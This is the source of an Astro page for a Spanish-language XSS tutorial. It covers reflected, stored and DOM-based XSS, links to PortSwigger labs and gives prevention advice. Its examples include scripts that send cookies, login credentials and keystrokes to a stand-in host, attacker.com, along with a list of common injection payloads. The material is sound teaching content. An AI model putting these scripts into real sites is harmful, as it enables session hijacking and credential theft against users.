---
import BaseLayout from "../../layouts/BaseLayout.astro";
---
<BaseLayout title="Cross-Site Scripting (XSS) - Web Security">
  <div class="websec-container">
    <!-- Breadcrumb -->
    <div class="breadcrumb">
      <a href="/websecurity/">Web Security</a>
      <span class="separator">â†’</span>
      <span class="current">Cross-Site Scripting (XSS)</span>
    </div>

    <!-- Hero Section -->
    <section class="detail-hero">
      <div class="hero-badge critical">
        <span class="badge-icon">ğŸ”´</span>
        OWASP Top 3
      </div>
      <h1 class="detail-title">
        <span class="title-icon">âš¡</span>
        Cross-Site Scripting (XSS)
      </h1>
      <p class="detail-description">
        Domina los ataques XSS: Reflected, Stored y DOM-based. Aprende a crear payloads efectivos 
        y a implementar defensas robustas contra la inyecciÃ³n de scripts maliciosos.
      </p>
    </section>

    <!-- Quick Stats -->
    <div class="quick-stats">
      <div class="stat-card">
        <span class="stat-icon">ğŸ“Š</span>
        <div>
          <div class="stat-value">Severity</div>
          <div class="stat-label">High</div>
        </div>
      </div>
      <div class="stat-card">
        <span class="stat-icon">ğŸ§ª</span>
        <div>
          <div class="stat-value">2 Labs</div>
          <div class="stat-label">PortSwigger</div>
        </div>
      </div>
      <div class="stat-card">
        <span class="stat-icon">â±ï¸</span>
        <div>
          <div class="stat-value">~2 horas</div>
          <div class="stat-label">Tiempo estimado</div>
        </div>
      </div>
      <div class="stat-card">
        <span class="stat-icon">ğŸ“ˆ</span>
        <div>
          <div class="stat-value">FÃ¡cil</div>
          <div class="stat-label">Dificultad</div>
        </div>
      </div>
    </div>

    <!-- Content Section -->
    <div class="content-section">
      <!-- Introduction -->
      <div class="content-card">
        <h2>
          <span class="section-icon">ğŸ“–</span>
          Â¿QuÃ© es Cross-Site Scripting?
        </h2>
        <p>
          Cross-Site Scripting (XSS) es una vulnerabilidad que permite a un atacante inyectar scripts 
          maliciosos (generalmente JavaScript) en pÃ¡ginas web vistas por otros usuarios. Cuando la vÃ­ctima 
          carga la pÃ¡gina comprometida, el script se ejecuta en su navegador con:
        </p>
        <ul class="feature-list">
          <li><span class="list-icon">ğŸª</span> Acceso a cookies y tokens de sesiÃ³n</li>
          <li><span class="list-icon">ğŸ­</span> Capacidad de realizar acciones en nombre del usuario</li>
          <li><span class="list-icon">ğŸ“</span> ModificaciÃ³n del contenido de la pÃ¡gina</li>
          <li><span class="list-icon">ğŸ”‘</span> Robo de credenciales mediante keylogging</li>
        </ul>
      </div>

      <!-- Types -->
      <div class="content-card">
        <h2>
          <span class="section-icon">ğŸ¯</span>
          Tipos de XSS
        </h2>
        
        <div class="type-grid">
          <div class="type-card">
            <div class="type-header">
              <span class="type-icon">ğŸ”„</span>
              <h3>Reflected XSS</h3>
            </div>
            <p>
              El script malicioso se refleja inmediatamente en la respuesta del servidor. 
              La vÃ­ctima debe hacer clic en un enlace especialmente crafteado.
            </p>
            <div class="xss-example">
              <code>https://site.com/search?q={'<script>alert(1)</script>'}</code>
            </div>
          </div>

          <div class="type-card">
            <div class="type-header">
              <span class="type-icon">ğŸ’¾</span>
              <h3>Stored XSS</h3>
            </div>
            <p>
              El payload se almacena en el servidor (base de datos, comentarios, perfiles) 
              y se ejecuta cada vez que alguien ve el contenido infectado.
            </p>
            <div class="type-subtypes">
              <span class="subtype-tag danger">MÃ¡s peligroso</span>
              <span class="subtype-tag">Persistente</span>
            </div>
          </div>

          <div class="type-card">
            <div class="type-header">
              <span class="type-icon">ğŸŒ</span>
              <h3>DOM-based XSS</h3>
            </div>
            <p>
              La vulnerabilidad existe en el cÃ³digo JavaScript del lado del cliente. 
              El servidor nunca ve el payload malicioso.
            </p>
            <div class="type-subtypes">
              <span class="subtype-tag">Client-side</span>
              <span class="subtype-tag">MÃ¡s difÃ­cil de detectar</span>
            </div>
          </div>
        </div>
      </div>

      <!-- Example -->
      <div class="content-card">
        <h2>
          <span class="section-icon">ğŸ’»</span>
          Ejemplos de Ataques
        </h2>
        
        <div class="attack-scenarios">
          <div class="scenario-card">
            <h4>ğŸª Cookie Stealing</h4>
            <div class="code-example">
              <pre><code>&lt;script&gt;
  fetch('https://attacker.com/steal?c=' + document.cookie);
&lt;/script&gt;</code></pre>
            </div>
          </div>

          <div class="scenario-card">
            <h4>ğŸ£ Phishing</h4>
            <div class="code-example">
              <pre><code>&lt;script&gt;
  document.body.innerHTML = '&lt;form action="https://attacker.com"&gt;
    Login: &lt;input name="user"&gt;&lt;input type="password" name="pass"&gt;
  &lt;/form&gt;';
&lt;/script&gt;</code></pre>
            </div>
          </div>

          <div class="scenario-card">
            <h4>âŒ¨ï¸ Keylogging</h4>
            <div class="code-example">
              <pre><code>&lt;script&gt;
  document.addEventListener('keypress', function(e) {
    fetch('https://attacker.com/log?key=' + e.key);
  });
&lt;/script&gt;</code></pre>
            </div>
          </div>
        </div>
      </div>

      <!-- Labs Section -->
      <div class="content-card">
        <h2>
          <span class="section-icon">ğŸ§ª</span>
          Laboratorios PrÃ¡cticos
        </h2>
        
        <div class="labs-grid">
          <a href="/WebSecurity/xss/PortSwigger/Lab1.html" class="lab-card">
            <div class="lab-number">Lab 01</div>
            <h3>Reflected XSS BÃ¡sico</h3>
            <p>Aprende a identificar y explotar Reflected XSS</p>
            <div class="lab-meta">
              <span class="lab-difficulty easy">FÃ¡cil</span>
              <span class="lab-time">â±ï¸ 20 min</span>
            </div>
          </a>

          <a href="/WebSecurity/xss/PortSwigger/Lab2.html" class="lab-card">
            <div class="lab-number">Lab 02</div>
            <h3>Stored XSS</h3>
            <p>Explota XSS persistente en comentarios</p>
            <div class="lab-meta">
              <span class="lab-difficulty easy">FÃ¡cil</span>
              <span class="lab-time">â±ï¸ 25 min</span>
            </div>
          </a>
        </div>
      </div>

      <!-- Common Payloads -->
      <div class="content-card">
        <h2>
          <span class="section-icon">âš¡</span>
          Payloads Comunes
        </h2>
        <div class="payloads-grid">
          <div class="payload-item">
            <div class="payload-header">BÃ¡sico</div>
            <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>
          </div>
          <div class="payload-item">
            <div class="payload-header">IMG Tag</div>
            <code>&lt;img src=x onerror=alert(1)&gt;</code>
          </div>
          <div class="payload-item">
            <div class="payload-header">SVG</div>
            <code>&lt;svg onload=alert(1)&gt;</code>
          </div>
          <div class="payload-item">
            <div class="payload-header">Evento</div>
            <code>&lt;body onload=alert(1)&gt;</code>
          </div>
          <div class="payload-item">
            <div class="payload-header">Iframe</div>
            <code>&lt;iframe src="javascript:alert(1)"&gt;</code>
          </div>
          <div class="payload-item">
            <div class="payload-header">Base64</div>
            <code>&lt;img src=x onerror="eval(atob('YWxlcnQoMSk='))"&gt;</code>
          </div>
        </div>
      </div>

      <!-- Prevention -->
      <div class="content-card prevention-card">
        <h2>
          <span class="section-icon">ğŸ›¡ï¸</span>
          PrevenciÃ³n y MitigaciÃ³n
        </h2>
        <div class="prevention-grid">
          <div class="prevention-item">
            <span class="prevention-icon">âœ…</span>
            <div>
              <h4>Output Encoding</h4>
              <p>Escapa todos los datos antes de renderizarlos en HTML</p>
            </div>
          </div>
          <div class="prevention-item">
            <span class="prevention-icon">âœ…</span>
            <div>
              <h4>Content Security Policy (CSP)</h4>
              <p>Define polÃ­ticas que restringen la ejecuciÃ³n de scripts</p>
            </div>
          </div>
          <div class="prevention-item">
            <span class="prevention-icon">âœ…</span>
            <div>
              <h4>HTTPOnly Cookies</h4>
              <p>Marca cookies sensibles como HTTPOnly para prevenir acceso desde JS</p>
            </div>
          </div>
          <div class="prevention-item">
            <span class="prevention-icon">âœ…</span>
            <div>
              <h4>Input Validation</h4>
              <p>Valida y sanitiza entrada del usuario en el servidor</p>
            </div>
          </div>
        </div>

        <div class="csp-example">
          <h4>Ejemplo de CSP Header:</h4>
          <div class="code-example">
            <pre><code>Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline';</code></pre>
          </div>
        </div>
      </div>

      <!-- Resources -->
      <div class="content-card resources-mini">
        <h2>
          <span class="section-icon">ğŸ“š</span>
          Recursos Adicionales
        </h2>
        <div class="resources-links">
          <a href="/WebSecurity/xss/HackTheBox/Machine1.html" class="resource-link">
            <span class="resource-emoji">ğŸ´</span>
            <span>HackTheBox XSS Challenges</span>
          </a>
          <a href="https://portswigger.net/web-security/cross-site-scripting" class="resource-link" target="_blank">
            <span class="resource-emoji">ğŸ“</span>
            <span>PortSwigger XSS Academy</span>
          </a>
          <a href="https://owasp.org/www-community/attacks/xss/" class="resource-link" target="_blank">
            <span class="resource-emoji">ğŸ“–</span>
            <span>OWASP XSS Guide</span>
          </a>
        </div>
      </div>
    </div>

    <!-- Back Button -->
    <div class="navigation-back">
      <a href="/websecurity/" class="btn-back">
        <span class="back-arrow">â†</span>
        Volver a Web Security
      </a>
    </div>
  </div>
</BaseLayout>
